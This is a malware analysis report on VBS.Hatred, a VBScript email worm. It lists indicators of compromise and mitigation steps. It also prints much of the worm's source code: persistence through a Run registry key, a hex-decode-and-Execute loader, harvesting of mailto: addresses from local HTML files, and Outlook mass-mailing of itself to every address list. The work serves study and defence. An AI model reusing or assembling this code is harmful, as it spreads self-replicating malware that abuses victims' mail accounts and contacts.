# 🛡️ Malware Analysis Report: VBS.Hatred

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-VBScript%20worm%20%2B%20email%20harvester-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--29-orange)

## Overview

VBS.Hatred is a VBScript worm that persists to the Windows directory, then:
- Scans local HTML files for embedded "mailto:" links to harvest emails.
- Mass-mails itself via Outlook, both to harvested emails and to all address lists.
- Ships in two forms in this folder:
  - `hatred.vbs` — obfuscated; a hex-encoded payload executed at runtime.
  - `hatred-vbs-version.vbs` — the deobfuscated/plain version.

> Historical malware analysis for research/education. Do not execute outside an isolated, lawful lab.

## Execution chain at a glance

1) On first run, the script copies itself to `%WINDIR%\LoveVSHatred.vbs` and writes an HKLM Run value `LVSH`.
2) Only when the running script path equals the copied path does it proceed to:
   - Recursively traverse My Documents and the Windows directory.
   - For each HTML file, harvest `mailto:` addresses and send an email with the script attached (twice in one variant).
   - Enter an infinite loop sending to all Outlook address lists.

---

## Obfuscated loader (`hatred.vbs`)

The packed variant decodes a hex string and executes it dynamically:

```vb
On Error Resume Next
Execute Q("4F6E204572726F7220526573756D65204E6578740D0A...00")

Function Q(swpe)
For O=1 To Len(swpe) Step 2
  Q = Q & Chr("&h" & Mid(swpe,O,2))
Next
End Function
' Encrypt with the PetiK's VBS Hex Convert Tool
```

The string decodes to the plaintext script present in `hatred-vbs-version.vbs`.

---

## Plain script behavior (`hatred-vbs-version.vbs`)

### Local copy and persistence

```vb
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")

orig  = WScript.ScriptFullName
fcopy = fso.GetSpecialFolder(0) & "\LoveVSHatred.vbs"  ' %WINDIR%
Call Copy(orig, fcopy)

If orig = fcopy Then
  list ws.SpecialFolders("MyDocuments")
  list fso.GetSpecialFolder(0)   ' %WINDIR%
  Do
    ' ... Outlook blast to all AddressLists (infinite loop)
  Loop
End If

Sub Copy(src, dst)
  fso.CopyFile orig, fcopy
  ws.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\Run\LVSH", fcopy
End Sub
```

- Ensures the active copy lives in `%WINDIR%` with Run key `LVSH`.
- Only continues payload when already executing from the copied location.

### Recursive traversal and HTML harvesting

```vb
Sub list(dir)
  For Each f1 In fso.GetFolder(dir).SubFolders
    infect f1.Path
    list f1.Path
  Next
End Sub

Sub infect(dir)
  For Each fil In fso.GetFolder(dir).Files
    ext = LCase(fso.GetExtensionName(fil.Path))
    If ext = "htm" Or ext = "html" Then
      Set h = fso.OpenTextFile(fil.Path, 1)
      scnm = h.ReadAll: h.Close
      For j = 1 To Len(scnm)
        If Mid(scnm, j, 7) = "mailto:" Then
          mlto = "": cnt = 0
          Do While Mid(scnm, j + 7 + cnt, 1) <> """"
            mlto = mlto & Mid(scnm, j + 7 + cnt, 1)
            cnt = cnt + 1
          Loop
          SendMail mlto
        End If
      Next
    End If
  Next
End Sub
```

- Harvests every email following a `mailto:` until the next double quote.
- Targets two roots: My Documents and `%WINDIR%`.

### Outlook mass-mailing

Two mailer paths exist:

1) Infinite loop mailer to all address lists (inside `If orig = fcopy Then ... Do ... Loop`):

```vb
Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
For Each c In map.AddressLists
  If c.AddressEntries.Count <> 0 Then
    For d = 1 To c.AddressEntries.Count
      Set wpalr = out.CreateItem(0)
      wpalr.To = c.AddressEntries(d).Address
      wpalr.Subject = "Love or Hatred"
      wpalr.Body = "Open this file and choice..."
      wpalr.Attachments.Add WScript.ScriptFullName
      wpalr.DeleteAfterSubmit = True
      If wpalr.To <> "" Then wpalr.Send
    Next
  End If
Next
```

2) Targeted sender used by `infect()` when a mailto: is found:

```vb
Sub SendMail(email)
  Set out = CreateObject("Outlook.Application")
  Set mel = out.CreateItem(0)
  mel.To = email
  mel.Subject = "Love or Hatred ??"
  mel.Body = "Open this attached file and you will know if you have the love or the hatred"
  mel.Attachments.Add WScript.ScriptFullName
  mel.Attachments.Add (WScript.ScriptFullName)  ' duplicate attachment
  mel.Send
End Sub
```

Notes:
- Duplicate attachment line appears intentional or a mistake; results in two identical attachments.
- The top-level Do...Loop has no delay or exit, likely hammering Outlook continuously until failure.

---

## Indicators of Compromise (IoCs)

- Files:
  - `%WINDIR%\LoveVSHatred.vbs`
- Registry:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\LVSH = <windir>\LoveVSHatred.vbs`
- Email artifacts:
  - Subjects: "Love or Hatred" and "Love or Hatred ??"
  - Body: "Open this file and choice..." / longer persuasive text
  - Attachments: the script itself, sometimes duplicated
- Activity:
  - Heavy Outlook COM automation, repeated item creation/sending
  - File system reads of `.htm/.html` files under My Documents and `%WINDIR%`

## Mitigation

1. Remove the Run key `LVSH` and delete `%WINDIR%\LoveVSHatred.vbs`.
2. Block or restrict Outlook COM automation for untrusted scripts; enable programmatic access warnings.
3. Use email filtering to block suspicious VBS attachments and repetitive bursts from clients.
4. Limit Windows Script Host usage for standard users; monitor WSH execution.
5. Restore affected systems from clean backups and review Sent Items/Outbox for mass-mail traces.

## Notes

- The obfuscated variant (`hatred.vbs`) uses a simple hex decode+Execute wrapper around the same plaintext logic; detection should key on the behaviors and registry/file IoCs rather than solely on plaintext content.
- Case-insensitivity of the registry makes `Currentversion` acceptable on Windows, though it’s non-canonical.

— Analysis based on `hatred.vbs` and `hatred-vbs-version.vbs`, June 29, 2002.
